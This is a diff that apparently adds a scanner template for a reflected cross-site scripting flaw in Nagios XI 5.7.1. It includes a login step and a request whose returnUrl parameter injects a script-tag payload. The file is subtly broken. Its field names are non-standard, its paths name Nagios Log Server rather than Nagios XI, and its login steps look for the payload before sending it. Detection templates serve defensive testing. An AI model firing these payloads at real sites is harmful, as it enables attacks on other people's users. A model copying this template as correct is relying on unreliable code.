@@ -1,0 +1,71 @@
+id: nagios-xi-xss
+brief:
+    title: Nagios XI 5.7.1 - Cross-Site Scripting
+    by: ritikchaddha
+    level: medium
+    about: A reflected cross-site scripting (XSS) in Nagios XI 5.7.1 can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page.
+    label:
+        - nagios
+        - nagiosxi
+        - xss
+        - authenticated
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/nagioslogserver/login'
+      signs:
+        - "on": word
+          has:
+            - '"</script><script>alert(document.domain)</script>'
+            - '>Cancel</a>'
+          in: body_3
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header_3
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/nagioslogserver/login'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: csrf_ls={{csrf}}&username={{username}}&password={{password}}
+      signs:
+        - "on": word
+          has:
+            - '"</script><script>alert(document.domain)</script>'
+            - '>Cancel</a>'
+          in: body_3
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header_3
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/nagioslogserver/includes/components/ccm/?cmd=modify&id=1&page=1&returnUrl=%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&type=host'
+      signs:
+        - "on": word
+          has:
+            - '"</script><script>alert(document.domain)</script>'
+            - '>Cancel</a>'
+          in: body_3
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header_3
+          need: all
+        - "on": status
+          status:
+            - 200
